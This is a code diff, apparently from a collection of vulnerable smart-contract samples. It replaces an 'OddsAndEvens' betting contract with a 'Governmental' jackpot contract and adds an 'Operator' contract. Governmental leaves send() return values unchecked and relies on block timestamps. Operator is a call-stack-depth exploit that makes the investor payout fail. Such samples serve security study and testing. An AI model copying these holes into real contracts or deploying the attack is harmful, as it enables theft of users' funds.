@@ -1,46 +1,45 @@
-// SPDX-License-Identifier: MIT
-pragma solidity ^0.4.2;
+pragma solidity ^0.4.0;
 
-contract OddsAndEvens{
+contract Governmental {
+  address public owner;
+  address public lastInvestor;
+  uint public jackpot = 1 ether;
+  uint public lastInvestmentTimestamp;
+  uint public ONE_MINUTE = 1 minutes;
 
-  struct Player {
-    address addr;
-    uint number;
-  }
-
-  Player[2] public players;         //public only for debug purpose
-
-  uint8 tot;
-  address owner;
-
-  function OddsAndEvens() {
+  function Governmental() {
     owner = msg.sender;
-  }
-  function play(uint number) payable{
-    if (msg.value != 1 ether) throw;
-    players[tot] = Player(msg.sender, number);
-    tot++;
-
-    if (tot==2) andTheWinnerIs();
+    if (msg.value<1 ether) throw;
   }
 
-  function andTheWinnerIs() private {
-    bool res ;
-    uint n = players[0].number+players[1].number;
-    if (n%2==0) {
-      res = players[0].addr.send(1800 finney);
+  function invest() {
+    if (msg.value<jackpot/2) throw;
+    lastInvestor = msg.sender;
+    jackpot += msg.value/2;
+    lastInvestmentTimestamp = block.timestamp;
+  }
+
+  function resetInvestment() {
+    if (block.timestamp < lastInvestmentTimestamp+ONE_MINUTE)
+      throw;
+
+    lastInvestor.send(jackpot);
+    owner.send(this.balance-1 ether);
+
+    lastInvestor = 0;
+    jackpot = 1 ether;
+    lastInvestmentTimestamp = 0;
+  }
+}
+
+contract Operator {
+
+  function operate(address target, uint count) {
+    if (0<=count && count<1023) {
+      this.operate.gas(msg.gas-2000)(target, count+1);
     }
     else {
-      res = players[1].addr.send(1800 finney);
+      Governmental(target).resetInvestment();
     }
-
-    delete players;
-    tot=0;
   }
-
-  function getProfit() {
-    if(msg.sender!=owner) throw;
-    bool res = msg.sender.send(this.balance);
-  }
-
 }
